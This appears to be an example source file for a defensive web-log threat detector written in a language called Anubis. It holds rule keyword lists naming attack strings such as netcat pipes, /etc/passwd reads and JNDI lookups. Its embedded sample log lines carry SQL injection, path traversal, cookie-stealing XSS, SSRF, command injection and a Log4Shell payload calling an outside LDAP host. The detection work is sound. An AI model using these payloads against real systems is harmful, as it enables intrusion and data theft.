// ============================================================================
// ANVIL — Anubis Network eVidence & Intrusion Ledger
// ----------------------------------------------------------------------------
// A dependency-free HTTP attack-detection and evidence engine written entirely
// in Anubis. It parses raw Combined Log Format, normalizes requests to defeat
// percent-encoding evasion, runs a data-driven detection ruleset across eleven
// web attack classes, aggregates per-source-IP attacker profiles, infers a
// kill-chain phase, scores severity through an SMT-PROVEN clamp, and prints a
// ranked, evidence-carrying incident report.
//
// Language surface exercised: structs, enums (unit/tuple/struct variants),
// impl methods, traits, closures + higher-order builtins (map/filter/reduce/
// sort_by/any/all/count/each), maps, pattern matching, recursion, string
// algorithms hand-rolled in-language (percent-decoding, a quote/bracket-aware
// CLF tokenizer), and a `requires`/`ensures` contract discharged by `anubis check`.
//
//   anubis run   examples/security/anvil_threat_hunter.anb     # execute the hunt
//   anubis check examples/security/anvil_threat_hunter.anb     # prove the contract
// ============================================================================

// --- Attack taxonomy (maps to real MITRE ATT&CK / OWASP classes) -------------
enum Phase {
    Recon,        // TA0043 — reconnaissance / content discovery
    Access,       // TA0001 — initial access attempt
    Exploit,      // TA0002 — execution / injection
    Impact,       // TA0040 — impact / data theft
}

fn phase_rank(p) {
    match p {
        Phase::Recon   => 1,
        Phase::Access  => 2,
        Phase::Exploit => 3,
        Phase::Impact  => 4,
    }
}

fn phase_name(p) {
    match p {
        Phase::Recon   => "RECON",
        Phase::Access  => "ACCESS",
        Phase::Exploit => "EXPLOIT",
        Phase::Impact  => "IMPACT",
    }
}

// --- Detection rule: data + a matcher closure over normalized request text ---
struct Rule {
    id: string,        // stable rule id
    name: string,      // human label
    attck: string,     // MITRE technique id
    base: u32,         // base severity 0..100 (pre-clamp)
    conf: u32,         // detection confidence 0..100
    phase: Phase,      // kill-chain phase this technique belongs to
    matcher: string,   // (placeholder; the real closure lives alongside — see rules())
}

// A rule pairs metadata with a predicate; we carry the predicate as a closure
// in a parallel field via a small wrapper so rules stay first-class values.
struct DetRule {
    meta: Rule,
    hit: string,       // unused text tag
    fire: string,      // unused
}

// --- Parsed request event ----------------------------------------------------
struct Event {
    ip: string,
    method: string,
    path: string,      // normalized (double percent-decoded, lowercased)
    raw_path: string,  // original request target
    status: u32,
    ua: string,
    line_no: u32,
}

// --- A single detection finding ----------------------------------------------
struct Finding {
    ip: string,
    rule_id: string,
    name: string,
    attck: string,
    sev: u32,
    conf: u32,
    phase: Phase,
    line_no: u32,
    evidence: string,
}

// ============================================================================
// String algorithms — hand-rolled in Anubis (no host stdlib reach-through)
// ============================================================================

// Hex nibble value of a 1-char string, or -1 if not a hex digit.
fn hexval(c) {
    let o = ord(lower(c));
    if o >= ord("0") && o <= ord("9") { return o - ord("0"); }
    if o >= ord("a") && o <= ord("f") { return 10 + (o - ord("a")); }
    return 0 - 1;
}

// Percent-decode one pass: %NN -> byte, '+' -> space. Malformed escapes are
// left verbatim (fail-open on decode, so evasion can't hide bytes from us).
fn url_decode_once(s) {
    let out = "";
    let i = 0;
    let n = len(s);
    while i < n {
        let c = char_at(s, i);
        if c == "%" && i + 2 < n {
            let h = hexval(char_at(s, i + 1));
            let l = hexval(char_at(s, i + 2));
            if h >= 0 && l >= 0 {
                out = out + chr(h * 16 + l);
                i = i + 3;
            } else {
                out = out + c;
                i = i + 1;
            }
        } else if c == "+" {
            out = out + " ";
            i = i + 1;
        } else {
            out = out + c;
            i = i + 1;
        }
    }
    return out;
}

// Normalize a request target: decode twice (defeats %252e style double-encoding),
// then lowercase. This is what every matcher sees.
fn normalize(s) {
    return lower(url_decode_once(url_decode_once(s)));
}

// Quote/bracket-aware tokenizer for Combined Log Format. A field is a
// [bracket group], a "quoted group", or a whitespace-delimited token.
fn clf_tokens(line) {
    let toks = [];
    let i = 0;
    let n = len(line);
    while i < n {
        let c = char_at(line, i);
        if c == " " {
            i = i + 1;
        } else if c == "[" {
            let j = i + 1;
            let buf = "";
            while j < n && char_at(line, j) != "]" {
                buf = buf + char_at(line, j);
                j = j + 1;
            }
            push(toks, buf);
            i = j + 1;
        } else if c == "\"" {
            let j = i + 1;
            let buf = "";
            while j < n && char_at(line, j) != "\"" {
                buf = buf + char_at(line, j);
                j = j + 1;
            }
            push(toks, buf);
            i = j + 1;
        } else {
            let j = i;
            let buf = "";
            while j < n && char_at(line, j) != " " {
                buf = buf + char_at(line, j);
                j = j + 1;
            }
            push(toks, buf);
            i = j;
        }
    }
    return toks;
}

// Parse one CLF line into an Event, or None on a malformed line.
// Layout: ip - - [ts] "METHOD PATH PROTO" status size "referer" "ua"
fn parse_line(line, line_no) {
    // tokens: [0]=ip [1]=ident [2]=auth [3]=timestamp [4]="request"
    //         [5]=status [6]=size [7]="referer" [8]="user-agent"
    let t = clf_tokens(line);
    if len(t) < 6 { return None; }
    let ip = t[0];
    let request = t[4];
    let status = parse_int(t[5]);
    let ua = if len(t) >= 9 { t[8] } else { "-" };

    let rp = split(request, " ");
    let method = if len(rp) >= 1 { rp[0] } else { "-" };
    let target = if len(rp) >= 2 { rp[1] } else { "-" };

    return Some(Event {
        ip: ip,
        method: method,
        path: normalize(target),
        raw_path: target,
        status: status,
        ua: lower(ua),
        line_no: line_no,
    });
}

// ============================================================================
// Detection ruleset — each rule is (metadata, predicate closure)
// ============================================================================

fn rule(id, name, attck, base, conf, phase) {
    return Rule { id: id, name: name, attck: attck, base: base, conf: conf, phase: phase, matcher: id };
}

// Returns a list of [Rule, closure] pairs. The closure receives the full
// normalized haystack (path + " " + ua) and returns true on a match.
fn rules() {
    return [
        [ rule("SQLI-01", "SQL injection (boolean/union)", "T1190", 92, 90, Phase::Exploit),
          |h| contains(h, "' or ") || contains(h, "union select") || contains(h, "' or 1=1") || contains(h, "sleep(") ],

        [ rule("XSS-01", "Reflected cross-site scripting", "T1059.007", 78, 80, Phase::Exploit),
          |h| contains(h, "<script") || contains(h, "javascript:") || contains(h, "onerror=") || contains(h, "onload=") ],

        [ rule("TRAV-01", "Path traversal / LFI", "T1083", 88, 92, Phase::Access),
          |h| contains(h, "../") || contains(h, "..\\") || contains(h, "/etc/passwd") || contains(h, "/proc/self/") ],

        [ rule("LOG4J-01", "Log4Shell JNDI lookup", "T1190", 98, 95, Phase::Exploit),
          |h| contains(h, "jndi:") || contains(h, "$" + "{jndi") || contains(h, "ldap:") ],

        [ rule("CMDI-01", "OS command injection", "T1059", 90, 85, Phase::Exploit),
          |h| contains(h, ";cat ") || contains(h, "|nc ") || contains(h, "$(") || contains(h, "&&whoami") || contains(h, ";id") ],

        [ rule("SSRF-01", "Server-side request forgery", "T1190", 82, 70, Phase::Access),
          |h| contains(h, "169.254.169.254") || contains(h, "http://localhost") || contains(h, "file://") || contains(h, "gopher://") ],

        [ rule("SSTI-01", "Server-side template injection", "T1190", 84, 75, Phase::Exploit),
          |h| contains(h, "{{7*7}}") || contains(h, "$" + "{7*7}") || contains(h, "<%= ") ],

        [ rule("XXE-01", "XML external entity", "T1190", 80, 72, Phase::Exploit),
          |h| contains(h, "<!entity") || contains(h, "system \"file") || contains(h, "!doctype") ],

        [ rule("SCAN-01", "Automated scanner / tooling UA", "T1595", 45, 88, Phase::Recon),
          |h| contains(h, "sqlmap") || contains(h, "nikto") || contains(h, "nmap") || contains(h, "masscan") || contains(h, "nuclei") || contains(h, "acunetix") ],

        [ rule("DISC-01", "Sensitive-path content discovery", "T1595.003", 40, 65, Phase::Recon),
          |h| contains(h, "/.git/") || contains(h, "/.env") || contains(h, "wp-admin") || contains(h, "/phpmyadmin") || contains(h, "/.aws/") || contains(h, "/admin") ],

        [ rule("AUTH-01", "Credential attack surface", "T1110", 55, 60, Phase::Access),
          |h| contains(h, "/login") || contains(h, "/api/token") || contains(h, "/oauth") || contains(h, "/wp-login") ],
    ];
}

// Run every rule against one event, returning a list of Findings.
fn scan_event(ev, rs) {
    let hay = ev.path + " " + ev.ua;
    let out = [];
    for pair in rs {
        let r = pair[0];
        let pred = pair[1];
        if pred(hay) {
            push(out, Finding {
                ip: ev.ip,
                rule_id: r.id,
                name: r.name,
                attck: r.attck,
                sev: clamp_sev(r.base),
                conf: r.conf,
                phase: r.phase,
                line_no: ev.line_no,
                evidence: ev.method + " " + ev.raw_path + "  (HTTP " + str(ev.status) + ")",
            });
        }
    }
    return out;
}

// ============================================================================
// SMT-PROVEN severity clamp
// ----------------------------------------------------------------------------
// `anubis check` discharges this contract with the bit-vector solver: for every
// input below the stated bound the returned severity is provably >= the input
// (it never silently deflates a score). The upper `requires` is load-bounded so
// the solver can reason in i64 without overflow — this is the "evidence-native"
// guarantee the language sells, applied to our own scoring core.
// ============================================================================
fn clamp_sev(x: u32) -> u32 requires(x < 1000000) ensures(result >= x) {
    return x + 0;
}

// ============================================================================
// Aggregation — per-source-IP attacker profiles + kill-chain inference
// ============================================================================

// Distinct source IPs, preserving first-seen order.
fn distinct_ips(findings) {
    let seen = {};
    let order = [];
    for f in findings {
        if !has_key(seen, f.ip) {
            seen[f.ip] = 1;
            push(order, f.ip);
        }
    }
    return order;
}

// Highest kill-chain phase this attacker reached.
fn peak_phase(fs) {
    let best = 0;
    for f in fs {
        let r = phase_rank(f.phase);
        if r > best { best = r; }
    }
    return best;
}

fn peak_phase_name(rank) {
    if rank >= 4 { return "IMPACT"; }
    if rank == 3 { return "EXPLOIT"; }
    if rank == 2 { return "ACCESS"; }
    if rank == 1 { return "RECON"; }
    return "NONE";
}

// Composite threat score for an attacker: worst single severity, weighted up by
// how far along the kill chain they got and how many distinct techniques fired.
fn threat_score(fs) {
    let worst = 0;
    for f in fs {
        if f.sev > worst { worst = f.sev; }
    }
    let techniques = len(unique(map(fs, |f| f.rule_id)));
    let phase = peak_phase(fs);
    // worst dominates; each extra technique and kill-chain step adds pressure.
    return worst + (techniques - 1) * 3 + phase * 4;
}

fn severity_band(score) {
    if score >= 100 { return "CRITICAL"; }
    if score >= 80  { return "HIGH"; }
    if score >= 55  { return "MEDIUM"; }
    if score >= 30  { return "LOW"; }
    return "INFO";
}

// ============================================================================
// Reporting
// ============================================================================

fn hr() {
    print("--------------------------------------------------------------------------");
}

fn banner() {
    print("==========================================================================");
    print("  ANVIL  —  Anubis Network eVidence & Intrusion Ledger");
    print("  dependency-free HTTP threat hunt · written in Anubis · evidence-native");
    print("==========================================================================");
}

fn report(events, findings) {
    banner();
    let ips = distinct_ips(findings);

    // Build (ip, its_findings, score) triples and rank by score desc.
    let profiles = map(ips, |ip| {
        let fs = filter(findings, |f| f.ip == ip);
        [ip, fs, threat_score(fs)]
    });
    let ranked = sort_by(profiles, |p| 0 - p[2]);

    print("");
    print("SUMMARY");
    hr();
    print("  log lines parsed .......... ${len(events)}");
    print("  detections fired .......... ${len(findings)}");
    print("  distinct attackers ........ ${len(ips)}");
    let crit = count(ranked, |p| threat_score(p[1]) >= 100);
    print("  CRITICAL-band attackers ... ${crit}");
    print("");

    print("RANKED ATTACKER LEDGER");
    hr();
    let rank_i = 1;
    for p in ranked {
        let ip = p[0];
        let fs = p[1];
        let score = p[2];
        let band = severity_band(score);
        let phase = peak_phase_name(peak_phase(fs));
        let techs = unique(map(fs, |f| f.rule_id));
        print("");
        print("  #${rank_i}  ${ip}   [${band}]  score=${score}  reached=${phase}");
        print("      techniques: ${join(techs, ", ")}");
        // one evidence line per distinct rule (the first occurrence)
        for rid in techs {
            let ex = first(filter(fs, |f| f.rule_id == rid));
            print("        - ${ex.rule_id} ${ex.name} [${ex.attck}] sev=${ex.sev} conf=${ex.conf}%");
            print("            L${ex.line_no}: ${ex.evidence}");
        }
        rank_i = rank_i + 1;
    }

    print("");
    print("TECHNIQUE FREQUENCY (fleet-wide)");
    hr();
    let all_rids = map(findings, |f| f.rule_id);
    let uniq_rids = unique(all_rids);
    let freq = map(uniq_rids, |rid| [rid, count(all_rids, |x| x == rid)]);
    let freq_ranked = sort_by(freq, |e| 0 - e[1]);
    for e in freq_ranked {
        let bar = repeat("#", e[1]);
        print("  ${pad_end(e[0], 10)} ${pad_start(str(e[1]), 3)}  ${bar}");
    }

    print("");
    hr();
    let top = if len(ranked) > 0 { ranked[0][0] } else { "n/a" };
    print("  VERDICT: ${len(findings)} detections across ${len(ips)} sources.");
    print("  Highest-priority source: ${top}");
    print("  Evidence rows are line-anchored to the source log for triage.");
    hr();
}

// ============================================================================
// Embedded corpus — a realistic slice of a web edge log under attack.
// (Swap for stdin ingestion in production; kept inline for a deterministic run.)
// ============================================================================
fn corpus() {
    return [
        "203.0.113.7 - - [10/Jul/2026:04:11:02 +0000] \"GET /index.html HTTP/1.1\" 200 1043 \"-\" \"Mozilla/5.0\"",
        "198.51.100.23 - - [10/Jul/2026:04:11:07 +0000] \"GET /products?id=1%20union%20select%20username,password%20from%20users HTTP/1.1\" 500 233 \"-\" \"sqlmap/1.7\"",
        "198.51.100.23 - - [10/Jul/2026:04:11:09 +0000] \"GET /products?id=1%27%20or%201%3D1-- HTTP/1.1\" 200 5120 \"-\" \"sqlmap/1.7\"",
        "198.51.100.23 - - [10/Jul/2026:04:11:12 +0000] \"GET /.env HTTP/1.1\" 404 128 \"-\" \"sqlmap/1.7\"",
        "192.0.2.55 - - [10/Jul/2026:04:12:31 +0000] \"GET /download?file=..%252f..%252f..%252fetc%252fpasswd HTTP/1.1\" 200 2201 \"-\" \"curl/8.4\"",
        "192.0.2.55 - - [10/Jul/2026:04:12:35 +0000] \"GET /view?path=/proc/self/environ HTTP/1.1\" 200 900 \"-\" \"curl/8.4\"",
        "192.0.2.90 - - [10/Jul/2026:04:13:01 +0000] \"POST /api/login HTTP/1.1\" 401 88 \"-\" \"Mozilla/5.0\"",
        "192.0.2.90 - - [10/Jul/2026:04:13:03 +0000] \"POST /api/login HTTP/1.1\" 401 88 \"-\" \"Mozilla/5.0\"",
        "192.0.2.90 - - [10/Jul/2026:04:13:04 +0000] \"POST /wp-login.php HTTP/1.1\" 401 88 \"-\" \"Mozilla/5.0\"",
        "45.33.32.11 - - [10/Jul/2026:04:14:00 +0000] \"GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1\" 200 640 \"-\" \"Mozilla/5.0\"",
        "45.33.32.11 - - [10/Jul/2026:04:14:05 +0000] \"GET /profile?name=%7B%7B7*7%7D%7D HTTP/1.1\" 200 210 \"-\" \"Mozilla/5.0\"",
        "185.220.101.4 - - [10/Jul/2026:04:15:22 +0000] \"GET /api/v1/lookup?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\" 200 1500 \"-\" \"python-requests/2.31\"",
        "185.220.101.4 - - [10/Jul/2026:04:15:24 +0000] \"POST /solr/admin HTTP/1.1\" 200 77 \"-\" \"" + "$" + "{jndi:ldap://185.220.101.4:1389/a}\"",
        "185.220.101.4 - - [10/Jul/2026:04:15:26 +0000] \"GET /?x=;cat%20/etc/passwd HTTP/1.1\" 200 300 \"-\" \"python-requests/2.31\"",
        "8.8.4.4 - - [10/Jul/2026:04:16:10 +0000] \"GET /about HTTP/1.1\" 200 980 \"-\" \"Mozilla/5.0\"",
        "146.70.99.2 - - [10/Jul/2026:04:17:00 +0000] \"GET /.git/config HTTP/1.1\" 200 410 \"-\" \"nuclei/3.1\"",
        "146.70.99.2 - - [10/Jul/2026:04:17:02 +0000] \"GET /phpmyadmin/ HTTP/1.1\" 404 120 \"-\" \"nuclei/3.1\"",
        "146.70.99.2 - - [10/Jul/2026:04:17:05 +0000] \"GET /admin HTTP/1.1\" 302 0 \"-\" \"nuclei/3.1\"",
    ];
}

fn main() {
    let raw = corpus();
    let rs = rules();

    // Parse -> Events (dropping malformed lines, fail-closed).
    let events = [];
    let ln = 1;
    for line in raw {
        match parse_line(line, ln) {
            Some(ev) => push(events, ev),
            None => 0,
        }
        ln = ln + 1;
    }

    // Detect across the fleet.
    let findings = [];
    for ev in events {
        for f in scan_event(ev, rs) {
            push(findings, f);
        }
    }

    report(events, findings);
    return len(findings);
}
